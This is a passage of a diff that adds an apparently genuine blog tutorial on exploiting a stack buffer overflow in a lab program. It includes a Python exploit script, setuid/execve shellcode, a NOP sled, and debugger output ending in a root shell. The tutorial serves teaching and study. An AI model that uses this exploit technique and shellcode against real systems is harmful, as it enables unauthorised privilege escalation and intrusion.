+<span class="w">    </span><span class="s">"</span><span class="se">\x68\x2f\x62\x69\x6e</span><span class="s">"</span><span class="w">      </span><span class="c1">// push   $0x6e69622f</span>
+<span class="w">    </span><span class="s">"</span><span class="se">\x89\xe3</span><span class="s">"</span><span class="w">                  </span><span class="c1">// mov    %esp,%ebx</span>
+<span class="w">    </span><span class="s">"</span><span class="se">\xcd\x80</span><span class="s">"</span><span class="w">                  </span><span class="c1">// int    $0x80</span>
+<span class="p">;</span><span class="w"></span>
+</pre></div>
+<p>For convenience, I've opted to create a Python script to generate our payload:</p><br/>
+<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">sys</span> 
+
+
+<span class="n">offset</span> <span class="o">=</span> <span class="mi">32</span>
+<span class="n">junk</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">"A"</span><span class="o">*</span><span class="n">offset</span>
+
+<span class="n">EIP</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\xa0\xcf\xff\xff</span><span class="s2">"</span>
+
+
+<span class="n">buf</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">""</span>
+
+
+<span class="c1"># https://shell-storm.org/shellcode/files/shellcode-516.html</span>
+
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x31\xdb</span><span class="s2">"</span>                  <span class="c1"># xor    %ebx,%ebx</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x6a\x17</span><span class="s2">"</span>                  <span class="c1"># push   $0x17</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x58</span><span class="s2">"</span>                      <span class="c1"># pop    %eax</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\xcd\x80</span><span class="s2">"</span>                  <span class="c1"># int    $0x80</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\xf7\xe3</span><span class="s2">"</span>                  <span class="c1"># mul    %ebx</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\xb0\x0b</span><span class="s2">"</span>                  <span class="c1"># mov    $0xb,%al</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x31\xc9</span><span class="s2">"</span>                  <span class="c1"># xor    %ecx,%ecx</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x51</span><span class="s2">"</span>                      <span class="c1"># push   %ecx</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x68\x2f\x2f\x73\x68</span><span class="s2">"</span>      <span class="c1"># push   $0x68732f2f</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x68\x2f\x62\x69\x6e</span><span class="s2">"</span>      <span class="c1"># push   $0x6e69622f</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x89\xe3</span><span class="s2">"</span>                  <span class="c1"># mov    %esp,%ebx</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\xcd\x80</span><span class="s2">"</span>                  <span class="c1"># int    $0x80</span>
+
+
+<span class="n">payload</span> <span class="o">=</span> <span class="n">junk</span> <span class="o">+</span> <span class="n">EIP</span> <span class="o">+</span> <span class="n">buf</span>
+
+
+<span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">buffer</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</pre></div>
+<p>When running the program again and providing our new payload containing the shellcode, everything executes correctly:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">gef$</span> <span class="n">run</span> <span class="o">&lt;&lt;&lt;</span> <span class="n">$</span><span class="p">(</span><span class="n">python</span> <span class="n">bofexploit</span><span class="o">.</span><span class="n">py</span><span class="p">)</span>
+<span class="n">Starting</span> <span class="n">program</span><span class="p">:</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">elswix</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">elswix</span><span class="o">/</span><span class="n">Local</span><span class="o">/</span><span class="n">bufferoverflow</span><span class="o">-</span><span class="n">article</span><span class="o">/</span><span class="n">shellcode</span><span class="o">/</span><span class="n">program</span> <span class="o">&lt;&lt;&lt;</span> <span class="n">$</span><span class="p">(</span><span class="n">python</span> <span class="n">bofexploit</span><span class="o">.</span><span class="n">py</span><span class="p">)</span>
+<span class="p">[</span><span class="n">Thread</span> <span class="n">debugging</span> <span class="n">using</span> <span class="n">libthread_db</span> <span class="n">enabled</span><span class="p">]</span>
+<span class="n">Using</span> <span class="n">host</span> <span class="n">libthread_db</span> <span class="n">library</span> <span class="s2">"/lib/x86_64-linux-gnu/libthread_db.so.1"</span><span class="o">.</span>
+
+<span class="n">process</span> <span class="mi">21752</span> <span class="ow">is</span> <span class="n">executing</span> <span class="n">new</span> <span class="n">program</span><span class="p">:</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">dash</span>
+
+<span class="p">[</span><span class="n">Thread</span> <span class="n">debugging</span> <span class="n">using</span> <span class="n">libthread_db</span> <span class="n">enabled</span><span class="p">]</span>
+<span class="n">Using</span> <span class="n">host</span> <span class="n">libthread_db</span> <span class="n">library</span> <span class="s2">"/lib/x86_64-linux-gnu/libthread_db.so.1"</span><span class="o">.</span>
+<span class="p">[</span><span class="n">Inferior</span> <span class="mi">1</span> <span class="p">(</span><span class="n">process</span> <span class="mi">21752</span><span class="p">)</span> <span class="n">exited</span> <span class="n">normally</span><span class="p">]</span>
+<span class="nd">gef$</span>
+</pre></div>
+<p>Indeed, as seen in GDB, the <code>execve()</code> function was executed as expected. Of course, all of this occurred within GDB. Now, let's observe what happens when the program runs outside of GDB:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="o">./</span><span class="n">program</span> <span class="o">&lt;&lt;&lt;</span> <span class="n">$</span><span class="p">(</span><span class="n">python</span> <span class="n">bofexploit</span><span class="o">.</span><span class="n">py</span><span class="p">)</span>
+<span class="n">zsh</span><span class="p">:</span> <span class="n">segmentation</span> <span class="n">fault</span> <span class="p">(</span><span class="n">core</span> <span class="n">dumped</span><span class="p">)</span>  <span class="o">./</span><span class="n">program</span> <span class="o">&lt;&lt;&lt;</span> <span class="n">$</span><span class="p">(</span><span class="n">python</span> <span class="n">bofexploit</span><span class="o">.</span><span class="n">py</span><span class="p">)</span>
+</pre></div>
+<p>That's not what I expected. Why didn't it work?</p><br/>
+<p>This is because the addresses of the stack differ from GDB. But why, if we disabled ASLR? Actually, it's not a problem of relocation; it's a problem with the contents within the stack. As you may know, the stack also stores environment variables when executing a program, and outside of GDB, they may differ, causing our payload to be moved to other addresses. There are also other data which may affect those addresses.</p><br/>
+<p>To address this issue, we have a couple of options. One approach is to use <code>env -i</code> when executing the program, which clears all environment variables, preventing the stack from being populated with them. Another method is to use NOPS (No Operation) to pad the payload.</p><br/>
+<p><strong>NOP (no operation)</strong> instructions perform no action, as implied by their name. This characteristic makes them particularly valuable in shellcode exploits because they merely execute the subsequent instruction. By inserting NOPs on the left side of our exploits and directing the EIP (instruction pointer) to the middle of them, the processor will <strong>continue executing no operations</strong> until it <strong>reaches our intended shellcode</strong>. This approach provides a wider margin for error; slight shifts in byte placement forward or backward will not significantly impact the execution, as it will only result in a different number of NOP instructions being executed. This technique of padding with NOPs is commonly referred to as a <strong>NOP slide</strong> or NOP sled, as the EIP effectively "slides" down these no-operation instructions.</p><br/>
+<p>Let's modify our script:</p><br/>
+<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">sys</span> 
+
+
+<span class="n">offset</span> <span class="o">=</span> <span class="mi">32</span>
+<span class="n">junk</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">"A"</span><span class="o">*</span><span class="n">offset</span>
+
+<span class="n">EIP</span> <span class="o">=</span> <span class="mh">0xffffcfa0</span><span class="o">+</span><span class="mi">300</span>
+<span class="n">EIP</span> <span class="o">=</span> <span class="n">EIP</span><span class="o">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="s2">"little"</span><span class="p">)</span>
+
+
+<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">junk</span> <span class="o">+</span> <span class="n">EIP</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x90</span><span class="s2">"</span><span class="o">*</span><span class="mi">100</span> <span class="o">+</span> <span class="n">buf</span>
+<span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">buffer</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</pre></div>
+<p>I've made some changes. First, I adjusted the stack address where the instruction pointer goes back to. I added 300 bytes because, outside of GDB, environment variables may differ. Without adding more bytes, the instruction pointer might not reach our payload. This is because the address is too small, especially outside of GDB. Also, I included NOPs because even though I added 300 bytes, we're not certain if that's where our shellcode starts. NOPs help us move through the stack until we find the shellcode reliably.</p><br/>
+<p>Now, when executing it, no errors are encountered.</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="o">./</span><span class="n">program</span> <span class="o">&lt;&lt;&lt;</span> <span class="n">$</span><span class="p">(</span><span class="n">python</span> <span class="n">bofexploit</span><span class="o">.</span><span class="n">py</span><span class="p">)</span>
+<span class="nd">elswix@ubuntu$</span>
+</pre></div>
+<p>But why didn't we obtain a shell with "/bin/sh"? Well, there's an explanation for this. I found this <a href="https://stackoverflow.com/questions/8509045/execve-bin-sh-0-0-in-a-pipe">Stack Overflow question</a> which explains this behavior. The problem arises when the standard input ends after the program execution. The solution is to use <code>cat</code>:</p><br/>
+<p><em>"This way you ensure that your program's standard input doesn't end after what <code>echo</code> outputs. Instead, <code>cat</code> continues to supply input to your program. The source of that subsequent input is your terminal since this is where <code>cat</code> reads from."</em></p><br/>
+<p>Let's test to see if it works:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="p">(</span><span class="n">python</span> <span class="n">bofexploit</span><span class="o">.</span><span class="n">py</span><span class="p">;</span> <span class="n">cat</span><span class="p">)</span> <span class="o">|</span> <span class="o">./</span><span class="n">program</span>
+<span class="n">whoami</span>
+<span class="n">whoami</span>
+<span class="n">root</span>
+<span class="nb">id</span>
+<span class="n">uid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">elswix</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">elswix</span><span class="p">),</span><span class="mi">4</span><span class="p">(</span><span class="n">adm</span><span class="p">),</span><span class="mi">24</span><span class="p">(</span><span class="n">cdrom</span><span class="p">),</span><span class="mi">27</span><span class="p">(</span><span class="n">sudo</span><span class="p">),</span><span class="mi">30</span><span class="p">(</span><span class="n">dip</span><span class="p">),</span><span class="mi">46</span><span class="p">(</span><span class="n">plugdev</span><span class="p">),</span><span class="mi">122</span><span class="p">(</span><span class="n">lpadmin</span><span class="p">),</span><span class="mi">135</span><span class="p">(</span><span class="n">lxd</span><span class="p">),</span><span class="mi">136</span><span class="p">(</span><span class="n">sambashare</span><span class="p">)</span>
+<span class="o">^</span><span class="n">C</span>
+<span class="nd">elswix@ubuntu$</span>
+</pre></div>
+<p>It worked! We've successfully achieved command execution as root, effectively exploiting the buffer overflow vulnerability.</p><br/>
+<h3>Conclusion</h3><br/>
+<p>In conclusion, the Shellcode technique is very useful when exploiting buffer overflows, especially when abusing the NX protection being disabled. However, in the wild, this is not that common, so in those cases, you should opt for other techniques.</p><br/>
+<p>In upcoming articles, we'll delve into bypassing protections such as ASLR and NX, involving the Return to Libc technique. Additionally, I'll create an article where we'll develop our own shellcode and return to this program to try it out.</p><br/>
+<p>I hope you learned something new from this article.</p><br/>
+<p>Happy Hacking!</p><br/>
+<h3>References</h3><br/>
+<p><a href="https://ir0nstone.gitbook.io/notes/types/stack/nops">https://ir0nstone.gitbook.io/notes/types/stack/nops</a></p>
+<p><a href="https://ir0nstone.gitbook.io/notes/types/stack/no-execute">https://ir0nstone.gitbook.io/notes/types/stack/no-execute</a></p>
+<p><a href="https://ir0nstone.gitbook.io/notes/types/stack/shellcode">https://ir0nstone.gitbook.io/notes/types/stack/shellcode</a></p>
+<p><a href="https://ir0nstone.gitbook.io/notes/types/stack/aslr">https://ir0nstone.gitbook.io/notes/types/stack/aslr</a></p>
+<p><a href="https://elswix.github.io/articles/5/introduction-to-buffer-overflow.html">https://elswix.github.io/articles/5/introduction-to-buffer-overflow.html</a></p>
+<p><a href="https://elswix.github.io/articles/4/binary-protections.html">https://elswix.github.io/articles/4/binary-protections.html</a></p>
+<p><a href="https://elswix.github.io/articles/3/cpu-and-assembly-binexp-basics.html">https://elswix.github.io/articles/3/cpu-and-assembly-binexp-basics.html</a></p>
+<p><a href="https://elswix.github.io/articles/understanding-linux-user-ids.html">https://elswix.github.io/articles/understanding-linux-user-ids.html</a></p>
+<p><a href="https://shell-storm.org/shellcode/files/shellcode-516.html">https://shell-storm.org/shellcode/files/shellcode-516.html</a></p>
+<p><a href="https://shell-storm.org/shellcode/index.html">https://shell-storm.org/shellcode/index.html</a></p>
+<p><a href="https://stackoverflow.com/questions/8509045/execve-bin-sh-0-0-in-a-pipe">https://stackoverflow.com/questions/8509045/execve-bin-sh-0-0-in-a-pipe</a></p><br/>
+            </div>
+        </div>
+    </section>
+
+    <footer>
+        <p>&copy; 2024 elswix.github.io</p>
+    </footer>
+</body>
+</html>
